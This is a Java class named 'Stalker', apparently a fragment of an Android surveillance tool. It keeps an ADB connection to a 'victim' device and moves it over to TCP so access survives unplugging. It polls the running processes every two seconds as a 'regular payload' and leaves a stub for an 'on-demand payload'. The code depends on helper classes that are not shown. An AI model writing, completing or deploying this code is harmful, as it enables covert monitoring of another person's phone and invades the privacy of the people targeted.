package core;

public class Stalker implements Runnable{
	
	private Adb adb;
	DeviceInfo device;
	boolean victimConnected;
	
	public Stalker(DeviceInfo device)
	{
		this.device = device;
		adb = new Adb(device);
		victimConnected = true;
	}


	@Override
	public void run() {
		while (true)
		{
			// 1. confirm the connectivity of victim
			if (device.tcpID.equals(""))
				device.tcpID = adb.getIPAddress()+":"+Adb.tcpPort;
			device.usbConnected = DeviceMonitor.adbDevices.contains(device.usbID);
			device.tcpConnected = DeviceMonitor.adbDevices.contains(device.tcpID);
			if (!device.tcpConnected && !device.usbConnected)
			{
				victimConnected = false;
				return;
			}
			if (!device.tcpConnected)
				adb.connectTCP();
			
			// 2. regular payload
			device.runningProcesses = P.read(adb.sendCmd("shell ps").getInputStream());
			P.print(device.runningProcesses);
			
			
			
			// 3. on-demand payload

			
			
			
			wait(2000);
		}
	}
	
	public void start()
	{
		new Thread(this).start();
	}

	
	private void wait(int milliseconds)
	{
		try
		{
			Thread.sleep(milliseconds);
		}
		catch (Exception e)
		{
			e.printStackTrace();
		}
	}

}
